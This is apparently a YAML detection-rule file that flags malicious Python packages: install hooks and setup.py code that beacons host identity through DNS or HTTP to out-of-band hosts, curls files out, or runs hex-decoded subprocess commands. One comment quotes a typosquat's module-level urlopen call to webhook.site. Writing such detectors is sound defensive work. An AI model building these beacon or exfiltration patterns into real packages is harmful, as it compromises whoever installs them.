defaults:
  crit: hostile
  platforms: [unix, windows]
  for: [python]
  attack: "T1195.002,T1041"
  mbc: "E1041"

composite_rules:
- id: python-install-hook-b32-dns-identity-beacon
  desc: Package install hook beacons identity as base32 DNS labels
  conf: 0.97
  attack: "T1195.002,T1048.003,T1082,T1033"
  scope: archive
  for: [python, pkginfo, python_sdist, whl, tar, zip]
  all:
  - id: metadata/build/package/recipe/setup-hooks::python-install-hook
  - id: objectives/exfiltration/dns/encoded::python-b32-host-profile-dns-exfil

  # An OOB call written at module scope in setup.py, not inside a command class.
  #
  # A `cmdclass` hook runs at install. Code at the top level of `setup.py` runs
  # whenever setuptools imports the file -- building a wheel, installing,
  # resolving metadata, even `pip download` -- so a top-level beacon fires more
  # often and earlier than a hook, and does so during operations the user does
  # not think of as "running" the package.
  #
  # An out-of-band collaborator host has one purpose: to prove a request
  # reached it. A build script contacting one is reporting that the package was
  # processed on this machine, to an address whose only function is to receive
  # that signal.
  #
  # Worked example: a botocore/s3transfer typosquat whose `setup.py`, at module
  # scope, opens `urllib.request.urlopen("https://webhook.site/<uuid>/s3transfer")`
  # before the `setup()` call.
- id: setup-py-module-scope-oob-callback
  desc: setup.py contacts an OOB host at import
  conf: 0.96
  all:
  - id: metadata/package/files/included::setup-py-basename
  - id: metadata/build/pip::packaging-setuptools-import
  - id: micro-behaviors/communications/url/host/oob::oob-endpoint-any
  any:
  - id: micro-behaviors/data/control-flow/module-exec::module-level-side-effect-call
  - id: micro-behaviors/process/create/thread::python-daemon-thread
  unless:
  - id: metadata/package/testing/

  # Hide the install-time subprocess argv as hex, then Popen it. Calculator
  # popups and similar "proof of install" gadgets use this shape; the command
  # string is not required.
  - id: "metadata/file/naming::test-directory-component"
- id: setup-py-hex-decoded-popen
  desc: setup.py Popen of hex-decoded bytes
  conf: 0.96
  all:
  - id: metadata/package/files/included::setup-py-basename
  - id: micro-behaviors/data/decode/hex::python-fromhex
  - id: "metadata/import/builtin::python-subprocess-import"
  - id: micro-behaviors/data/control-flow/module-exec::module-level-side-effect-call

- id: setup-py-aliased-popen
  desc: setup.py calls aliased subprocess.Popen
  conf: 0.94
  all:
  - id: metadata/package/files/included::setup-py-basename
  - id: metadata/import/builtin::alias-subprocess
  - id: micro-behaviors/process/create/subprocess::python-module-level-popen

- id: setup-py-curl-post-oob
  desc: setup.py curls a POST to an OOB host
  conf: 0.96
  all:
  - id: metadata/package/files/included::setup-py-basename
  - id: micro-behaviors/communications/http/curl::python-curl-argv-list
  - id: micro-behaviors/communications/url/host/oob::oob-endpoint-any
  - id: "micro-behaviors/process/fd/stdio::python-subprocess-near-devnull-stdio-assignment"

- id: setup-py-curl-post-file-oob
  desc: setup.py subprocess POSTs a file to OOB
  conf: 0.95
  all:
  - id: micro-behaviors/process/create/subprocess::setup-py-subprocess
  - id: micro-behaviors/communications/http/curl::python-curl-argv-list
  - id: micro-behaviors/communications/http/post::post

- id: python-install-hook-dns-oob
  desc: Install hook DNS-resolves an OOB host
  conf: 0.96
  scope: archive
  for: [python, pkginfo, python_sdist, whl, tar, zip]
  all:
  - id: metadata/build/package/recipe/setup-hooks::python-install-hook
  - id: micro-behaviors/communications/url/host/oob::oob-endpoint-any
  - id: micro-behaviors/communications/dns/resolver::getaddrinfo

- id: setup-py-urlencode-host-oob
  desc: setup.py urlencodes host identity to OOB
  conf: 0.96
  all:
  - id: metadata/package/files/included::setup-py-basename
  - id: micro-behaviors/communications/http/lib/urllib::urllib-urlencode
  - id: micro-behaviors/communications/url/host/oob::oob-endpoint-any
  - id: micro-behaviors/process/user/query::python-getpass-user

  # Disclosed bug-bounty / dependency-confusion canaries still ship executable
  # import-time beacons (PyPI lore-cs): METADATA explains the PoC while
  # `__init__.py` phones home to operator infrastructure on `import`.
- id: pypi-disclosed-depconf-import-beacon
  desc: Disclosed dependency-confusion import beacon
  conf: 0.98
  for: [whl, pkginfo, python]
  scope: archive
  all:
  - id: objectives/supply-chain/recon-exfil/import-time::import-time-urllib-json-host-profile-ip-beacon
  any:
  - id: metadata/package/description/disclosure::summary-depconf-subject
  - id: metadata/package/description/disclosure::pkginfo-security-research-claim
  needs: 1
  unless:
  - id: metadata/build/package/recipe/setup-hooks::namespace-reservation-placeholder-context
